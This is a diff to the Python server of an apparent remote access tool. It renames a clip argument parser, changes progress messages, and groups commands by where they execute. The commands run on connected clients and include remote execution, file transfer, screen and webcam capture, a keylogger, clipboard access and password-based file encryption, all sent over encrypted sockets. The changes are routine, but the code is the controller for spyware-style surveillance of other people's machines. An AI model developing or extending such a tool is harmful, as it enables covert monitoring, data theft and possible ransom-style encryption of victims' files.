@@ -243,7 +243,8 @@ class Connection:
         self.accept_new_connections_process.start()
         self.user_interface.pinfo("waiting for clients")
 
-    def get_conn_fgoi(self, objects):  # get connections from groups and/or indices
+    def get_conn_fgoi(self, objects):
+        """get connections from groups and/or indices"""
         connections = list()
         for goi in objects:
             for index, session in enumerate(self.sessions):
@@ -313,7 +314,7 @@ class Connection:
             for packet_number in range(total_packets):
                 connection.sendall(data[packet_number * self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
                 sys.stdout.write(
-                    f"\r[*] sending {self.format_byte_length(len_data_total)} ({packet_number + 1 / (total_packets / 100)}% complete)")
+                    f"\r[↑] {self.format_byte_length(len_data_total)} ({packet_number + 1 / (total_packets / 100)}% complete)")
                 sys.stdout.flush()
                 print()
         except socket.error as error:
@@ -328,7 +329,7 @@ class Connection:
             for _ in range(math.ceil(header / self.PACKET_SIZE)):
                 data.extend(connection.recv(self.PACKET_SIZE))
                 sys.stdout.write(
-                    f"\r[*] receiving {self.format_byte_length(header)} ({round(len(data) / (header / 100), 1)}% complete)")
+                    f"\r[↓] {self.format_byte_length(header)} ({round(len(data) / (header / 100), 1)}% complete)")
                 sys.stdout.flush()
                 print()
             received_dict = json.loads(self.decrypt(bytes(data), self.get_crypter_by_connection(connection)).decode(self.CODEC))
@@ -423,10 +424,10 @@ class UserInterface(cmd2.Cmd):
     log_keys_parser.add_argument("-f", "--file", default="log.txt", type=str, help="file to store logs in")
     log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
 
-    log_keys_parser = argparse.ArgumentParser(prog="clip")
-    log_keys_parser.add_argument("-c", "--content", default="", type=str,
+    clip_parser = argparse.ArgumentParser(prog="clip")
+    clip_parser.add_argument("-c", "--content", default="", type=str,
                                  help="content to store to clipboard if provided")
-    log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
+    clip_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
 
     block_parser = argparse.ArgumentParser(prog="block")
     block_parser.add_argument("-a", "--action", required=True, type=str, choices=["add", "rm", "list"])
@@ -539,7 +540,7 @@ class UserInterface(cmd2.Cmd):
         """Start/Stop keylogger"""
         self.server.log_keys(args.action, args.file, self.server.connection.get_conn_fgoi(args.sessions))
 
-    @cmd2.decorators.with_argparser(log_keys_parser)
+    @cmd2.decorators.with_argparser(clip_parser)
     def do_clip(self, args):
         """Get/Set clipboard content"""
         self.server.edit_clipboard(args.content, self.server.connection.get_conn_fgoi(args.sessions))
@@ -553,6 +554,28 @@ class UserInterface(cmd2.Cmd):
     def do_crypt(self, args):
         """En/decrypt a file or directory with password"""
         self.server.crypt(args.action, args.read, args.pwd, self.server.connection.get_conn_fgoi(args.sessions))
+
+    # categorize the functions
+    cmd2.categorize((do_list,
+                     do_exit,
+                     do_tag,
+                     do_close,
+                     do_group,
+                     do_block,
+                     cmd2.Cmd.do_edit,
+                     cmd2.Cmd.do_help,
+                     cmd2.Cmd.do_history,
+                     cmd2.Cmd.do_set,
+                     cmd2.Cmd.do_shell), "Executed on the server")
+    cmd2.categorize((do_exe,
+                     do_down,
+                     do_up,
+                     do_screen,
+                     do_zip,
+                     do_cam,
+                     do_logger,
+                     do_clip,
+                     do_crypt), "Executed on the client")
 
 
 if __name__ == "__main__":
